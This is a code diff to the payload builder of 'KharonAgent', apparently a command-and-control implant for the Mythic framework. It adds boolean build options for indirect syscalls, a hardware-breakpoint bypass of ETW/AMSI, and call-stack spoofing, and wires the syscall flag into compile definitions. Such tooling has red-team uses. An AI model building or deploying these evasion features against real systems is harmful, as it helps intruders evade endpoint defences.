@@ -70,6 +70,24 @@ class KharonAgent( PayloadType ):
             description     = "obfuscate the heap during sleep (note: a mask value other than \"none\" is required).",
         ),
         BuildParameter(
+            name            = "Indirect Syscall",
+            parameter_type  = BuildParameterType.Boolean,
+            default_value   = "false",
+            description     = "use indirect syscalls",
+        ),
+        BuildParameter(
+            name            = "Hardware Breakpoint",
+            parameter_type  = BuildParameterType.Boolean,
+            default_value   = "false",
+            description     = "use hardware breakpoint to bypass etw/amsi",
+        ),
+        BuildParameter(
+            name            = "Call Stack Spoofing",
+            parameter_type  = BuildParameterType.Boolean,
+            default_value   = "false",
+            description     = "spoof the call stack of the specifieds winapis",
+        ),
+        BuildParameter(
             name            = "Format",
             parameter_type  = BuildParameterType.ChooseOne,
             choices         = [ "exe", "dll", "svc", "bin"],
@@ -190,6 +208,7 @@ class KharonAgent( PayloadType ):
         MaskID     = self.get_parameter( "Mask" );
         HeapMask   = self.get_parameter( "Heap Mask" );
         Spawntox64 = self.get_parameter( "Spawnto" );
+        Syscalls   = self.get_parameter( "Indirect Syscall" );
 
         MakeArg = f"";
 
@@ -211,6 +230,11 @@ class KharonAgent( PayloadType ):
 
         if Config["ssl"] is True:
             Secure = 1;
+        
+        if Syscalls is True:
+            Syscalls = 1
+        else:
+            Syscalls = 0
 
         Def = {
             "Arch"      : f"ARCH={Arch}",
@@ -220,6 +244,7 @@ class KharonAgent( PayloadType ):
             "InjSc"     : f"KH_INJECTION_SC={InjectionSc[InjSc]}",
             "InjPE"     : f"KH_INJECTION_PE={InjectionPE[InjPE]}",
             "HeapMask"  : f"KH_HEAP_MASK={HeapMask}",
+            "Syscall"   : f"KH_SYSCALL_ENABLED={Syscalls}",
             "Spawntox64": f"KH_SPAWNTO_X64={Spawntox64}",
             "uuid"      : f"KH_AGENT_UUID={Config['payload_uuid']}",
             "web-port"  : f"WEB_PORT={Config['callback_port']}",
